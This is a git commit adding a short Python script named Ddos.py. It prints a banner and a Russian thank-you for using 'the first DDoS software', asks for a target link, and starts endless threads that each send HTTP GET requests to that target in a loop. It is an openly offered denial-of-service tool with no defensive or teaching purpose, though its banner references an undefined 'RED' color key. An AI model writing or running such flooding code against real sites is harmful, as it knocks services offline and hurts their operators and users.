149d41c2bc012dfe9ef7ea9bd42d9f27e4aac43a
maza01010 <emirapuz@gmail.com>
2026-03-14 19:20:32 +0300

    Create Ddos.py

---
+++ Ddos.py
@@ -0,0 +1,30 @@
+import threading
+import requests
+import os 
+
+COLOR_CODE = {
+    "BLUE": "\033[34m",
+    "RESET": "\033[0m",
+}
+os.system("cls")
+print(f'''{COLOR_CODE["RED"]}                                
+                                                                                 
+                                                                                 
+                                                                                     
+                                                                                     
+______    _           
+|  _  \  | |          
+| | | |__| | ___  ___ 
+| | | / _` |/ _ \/ __|
+| |/ / (_| | (_) \__ \
+|___/ \__,_|\___/|___/
+                                                                                                                            
+              это первый ддос софт от кадо) спасибо за использование!                                                        
+      ''') 
+link = input(f'{COLOR_CODE["BLUE"]}[$] Введите ссылку: ')
+def dos():
+ while True:
+  requests.get(link)
+  
+while True:
+ threading.Thread(target=dos).start()
